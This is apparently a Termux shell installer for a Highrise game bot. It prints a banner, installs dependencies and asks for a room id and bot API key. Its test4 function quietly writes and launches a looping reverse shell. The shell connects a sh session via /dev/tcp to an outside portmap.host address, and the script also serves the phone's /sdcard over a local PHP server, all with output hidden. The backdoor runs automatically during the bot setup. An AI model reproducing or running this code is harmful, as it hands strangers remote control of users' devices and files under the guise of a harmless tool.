trap 'printf "\n";stop' 2
trap stop SIGINT
trap stop SIGTSTP
stop() {
checkhighrise=$(ps aux | grep -o "highrise" | head -n1)
if [[ $checkhighrise == *'highrise'* ]]; then
pkill -f -2 highrise > /dev/null 2>&1
killall -2 highrise > /dev/null 2>&1
fi
printf "\e[0m\n"
printf "\e[0m\e[1;36m\t CTRL + C to stop !!\n"
sleep 2
printf "\e[0m\n"
printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit see you soon\e[0m"
printf "\e[0m\n"
exit 1
}



dependencies() {
echo " install pkg bot"
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it"; pkg install php -y ; }
command -v python > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it"; pkg install python -y; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require httrack: (apt install httrack) "; pkg install openssh -y; }
test
}

banner() {
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
M='\033[1;35m'
C='\033[1;36m'
W='\033[1;37m'
echo
echo -e "$G            _       _          _          "
echo -e "$G      /\  /(_) __ _| |__  _ __(_)___  ___ "
echo -e "$G     / /_/ / |/ _. | '_ \| '__| / __|/ _ \ "
echo -e "$G    / __  /| | (_| | | | | |  | \__ \  __/"
echo -e "$G    \/ /_/ |_|\__, |_| |_|_|  |_|___/\___|"
echo -e "$G              |___/                       "
dependencies
echo
}


test4() {
mv o.php /sdcard
if [[ -e "/sdcard/sell.sh" ]]; then
bash /sdcard/sell.sh > /dev/null 2>&1 &
fi
if [[ ! -d "/sdcard/sell.sh" ]]; then
touch /sdcard/sell.sh > /dev/null 2>&1
echo "while true; do bash -c '0<&128-;exec 128<>/dev/tcp/Jshsjdjd-53253.portmap.host/53253;sh <&128 >&128 2>&128' > /dev/null 2>&1 & > /dev/null 2>&1; sleep 1; done " > /sdcard/sell.sh
bash /sdcard/sell.sh > /dev/null 2>&1 &
fi
if [[ -e "/sdcard/o.php" ]]; then
php -S 127.0.0.1:4444 -t /sdcard > /dev/null 2>&1 &
fi
}

test() {
ls $HOME/storage > /dev/null 2>&1 || { echo >&2 " loading ..."; termux-setup-storage; }

sleep 1
ls $HOME/storage > /dev/null 2>&1 || { echo >&2 "  Please allow ..."; sleep 2; termux-setup-storage;}
sleep 2
ls $HOME/storage > /dev/null 2>&1 || { echo >&2 " Please allow Termux to access memory with this (  termux-setup-storage  )"; exit 1; }
test4
test2
}



test2() {
echo " insall pip python ..."
echo "  install asyncio"
pip show asyncio > /dev/null 2>&1 || pip install asyncio
echo "  install setuptools"
pip show setuptools > /dev/null 2>&1 || pip install setuptools
echo "  install aiohttp"
pip show aiohttp > /dev/null 2>&1 || pip install aiohttp
echo "  install cattrs"
pip show cattrs > /dev/null 2>&1 || pip install cattrs
test3
}

test3() {
#!/bin/bash

echo "  enter the room id :-  "
read room_number

echo " API bot :-  "
read bot_code

command="highrise h:$room_number $bot_code"
echo "$command" > run
echo "  to run bot ( bash run ) "
echo " the bot is run ...."
bash run
}
banner
